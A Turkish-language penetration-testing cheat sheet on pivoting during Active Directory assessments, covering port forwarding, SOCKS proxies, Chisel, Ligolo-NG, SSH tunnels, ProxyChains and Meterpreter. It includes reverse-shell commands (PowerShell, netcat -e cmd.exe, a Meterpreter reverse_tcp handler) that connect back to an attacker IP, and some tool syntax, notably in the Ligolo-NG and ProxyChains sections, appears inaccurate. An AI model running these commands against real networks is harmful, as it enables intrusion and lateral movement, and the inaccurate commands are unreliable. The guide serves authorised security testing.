# Active Directory Pentest - Pivoting Safhası Metodolojisi

## Pivoting Nedir?
Pivoting, bir ağ üzerindeki bir cihazdan, başka cihazlara veya ağlara erişim elde etme işlemidir. Özellikle Active Directory (AD) pentestlerinde, bir ağın farklı bölümlerine erişim sağlamak için pivoting işlemi gerçekleştirilir. Bu rehberde, pivoting safhasında kullanılan tüm komutlar, yollar ve yöntemler detaylıca açıklanmıştır.

## Pivoting Süreci
Pivoting işlemi genellikle şu adımları içerir:

1. **Erişim Sağlama**: İlk hedef cihazda shell veya RDP gibi erişim elde edilir.
2. **Bağlantı Yönlendirme (Port Forwarding)**: İç ağda başka cihazlara erişim sağlanır.
3. **Ağ Keşfi**: Yeni hedef cihazların keşfi yapılır.
4. **Yetkilendirme (Authentication)**: Yeni cihazlara bağlantı için kimlik doğrulama işlemleri gerçekleştirilir.
5. **Saldırı ve Bilgi Çalma**: Yeni cihazlarda saldırılar gerçekleştirilir.

---

## Pivoting Komutları ve Yöntemleri

### 1. **PowerShell Kullanarak Pivoting**
#### **Komutlar ve Açıklamaları**

**1.1. Port Forwarding Yapmak için `New-SSHSession` (Posh-SSH Modülü)**
```powershell
# SSH oturumu oluştur
New-SSHSession -ComputerName "10.10.10.10" -Credential (Get-Credential)

# Port forward işlemi
New-SSHPortForward -SSHSessionId 0 -LocalPort 8888 -RemoteHost "192.168.1.10" -RemotePort 3389
```
* **Amaç**: Bir cihaz üzerindeki RDP portunu yerel makineye yönlendirmek.

**1.2. Proxy Kullanımı için `Invoke-SocksProxy`**
```powershell
# SOCKS proxy başlat
Invoke-SocksProxy -BindPort 1080
```
* **Amaç**: Proxy üzerinden diğer ağ cihazlarına bağlantı sağlamak.

**1.3. Reverse Shell için `Invoke-PowerShellTcp`**
```powershell
# Reverse Shell oluştur
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444
```
* **Amaç**: Uzak bir cihazdan bağlantı almak.

---

### 2. **CMD Kullanarak Pivoting**
#### **Komutlar ve Açıklamaları**

**2.1. `netsh` ile Port Forwarding**
```cmd
# Port yönlendirme kuralı ekle
netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=8888 connectaddress=192.168.1.10 connectport=3389

# Mevcut kuralları görüntüle
netsh interface portproxy show all
```
* **Amaç**: Yerel bağlantıları hedef cihaza yönlendirmek.

**2.2. Reverse Shell için `cmd`**
```cmd
# Netcat kullanarak reverse shell
nc.exe -e cmd.exe 192.168.1.100 4444
```
* **Amaç**: Uzak bir makineye erişim sağlamak.

---

### 3. **Chisel Kullanımı**
#### **Komutlar ve Açıklamaları**

**3.1. Chisel Server Başlatma (Kali Linux)**
```bash
./chisel server -p 8000 --reverse
```
* **Amaç**: Reverse bağlantıları kabul etmek.

**3.2. Chisel Client ile Bağlanma (Windows)**
```cmd
chisel.exe client 192.168.1.100:8000 R:3389:127.0.0.1:3389
```
* **Amaç**: Hedef cihazın RDP portunu yerel makineye yönlendirmek.

---

### 4. **Ligolo-NG Kullanımı**
#### **Komutlar ve Açıklamaları**

**4.1. Ligolo-NG Server Başlatma (Kali Linux)**
```bash
ligolo-ng proxy -p 8000
```
* **Amaç**: Reverse proxy server başlatmak.

**4.2. Ligolo-NG Client ile Bağlanma (Windows)**
```cmd
ligolo-ng.exe tunnel -s 192.168.1.100:8000 -t 127.0.0.1:3389
```
* **Amaç**: Hedef cihazın RDP portunu yerel makineye yönlendirmek.

---

### 5. **SSH Tunneling ile Pivoting**
#### **Komutlar ve Açıklamaları**

**5.1. Port Forwarding**
```bash
ssh -L 8888:192.168.1.10:3389 user@10.10.10.10
```
* **Amaç**: Yerel portu hedef cihazdaki bir porta yönlendirmek.

**5.2. Dinamik Proxy (SOCKS)**
```bash
ssh -D 1080 user@10.10.10.10
```
* **Amaç**: Dinamik proxy oluşturmak ve tarama işlemleri için kullanmak.

**5.3. Reverse Tunnel Oluşturma**
```bash
ssh -R 2222:127.0.0.1:22 user@192.168.1.100
```
* **Amaç**: Uzak makineden yerel makineye bağlantı sağlamak.

---

### 6. **ProxyChains Kullanımı**
#### **Komutlar ve Açıklamaları**

**6.1. ProxyChains Konfigürasyonu**
```bash
# /etc/proxychains.conf dosyasını düzenleyin
tor
```
* **Amaç**: ProxyChains ayarlarını yapmak.

**6.2. ProxyChains ile Nmap Taraması**
```bash
proxychains nmap -sT -Pn 192.168.1.0/24
```
* **Amaç**: Proxy üzerinden ağ taraması yapmak.

---

### 7. **Meterpreter Kullanarak Pivoting**
#### **Komutlar ve Açıklamaları**

**7.1. Reverse TCP Shell Açmak**
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```
* **Amaç**: Meterpreter ile shell elde etmek.

**7.2. Socks Proxy Kurmak**
```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
run
```
* **Amaç**: Proxy ile diğer cihazlara erişim sağlamak.

---

$ sudo ip tuntap add user kali mode tun ligolo

$ sudo ip link set ligolo up

@Attack Machine
./proxy -selfcert -laddr 0.0.0.0:9001

@Jump Host
agent.exe -connect kali.ip:9001 -ignore-cert

@Attack Machine
session
1
start

sudo ip route add hedef.ip.araligi/24 dev ligolo
192.168.1.3
172.16.1.0
sudo ip tuntap del dev ligolo mode tun

## Sonuç
Bu rehber, Active Directory pentestlerinde pivoting safhasında kullanılan tüm komutları ve yöntemleri kapsamaktadır. Her bir yöntem, farklı bir senaryo için uygundur ve hangi yöntemin kullanılacağına, mevcut erişim durumuna göre karar verilmelidir. Rehberi ihtiyaçlarınıza göre genişletebilirsiniz.
